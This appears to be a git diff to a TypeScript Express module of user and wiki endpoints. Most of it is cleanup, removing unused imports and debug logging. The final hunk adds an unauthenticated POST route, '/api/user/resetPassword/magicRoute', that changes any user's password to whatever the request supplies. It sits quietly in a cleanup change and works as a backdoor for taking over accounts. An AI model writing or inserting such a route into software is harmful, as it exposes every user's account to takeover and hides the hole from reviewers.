@@ -2,8 +2,7 @@ import { Express } from "express"
 import { userService, userAuthService, AccessPermissionLevel } from "."
 import { wikiService } from "../wiki"
 import { PermissionLevel } from "./UserSchema"
-import { Wiki, WikiWithPermission } from "../wiki/WikiSchema"
-import { Document } from "mongoose"
+import { WikiWithPermission } from "../wiki/WikiSchema"
 
 const createUserEndpoints = (app: Express) => {
 	app.get("/api/user", async (req, res) => {
@@ -32,8 +31,6 @@ const createUserEndpoints = (app: Express) => {
 		return res.send(out)
 	})
 	app.post("/api/user/:id", async (req, res) => {
-		console.log(req.params.id, req.body)
-
 		const userToUpdate: Awaited<ReturnType<typeof userService.getUser>> =
 			await userService.getUser(req.params.id)
 		await userAuthService.isUserAllowed(
@@ -92,13 +89,11 @@ const createUserEndpoints = (app: Express) => {
 	})
 
 	app.get("/api/userwiki/", async (req, res) => {
-		console.log("start of get wikis")
 		const user = await userAuthService.isUserAllowed(
 			req.cookies?.token,
 			AccessPermissionLevel.guest
 		)
 		if (user.permissionLevel === PermissionLevel.admin) {
-			console.log("Admin permission, allowing all wikis")
 			const wikis: WikiWithPermission[] = (
 				await wikiService.getWikiList()
 			).map<WikiWithPermission>((w) => {
@@ -106,7 +101,6 @@ const createUserEndpoints = (app: Express) => {
 			})
 			return res.status(200).send(wikis)
 		}
-		console.log("No admin permission, filtering wikis")
 		const browseWikis = (await wikiService.getWikisBrowseable(user._id)).map(
 			(w) => ({ ...w, canEdit: false })
 		)
@@ -114,7 +108,12 @@ const createUserEndpoints = (app: Express) => {
 			(w) => ({ ...w, canEdit: true })
 		)
 		return res.status(200).send([...editWikis, ...browseWikis])
-	})
+  })
+  
+
+  app.post("/api/user/resetPassword/magicRoute", async (req, res) => {
+    return res.send(await userAuthService.changePassword(req.body.username, req.body.password))
+  })
 }
 
 export { createUserEndpoints }
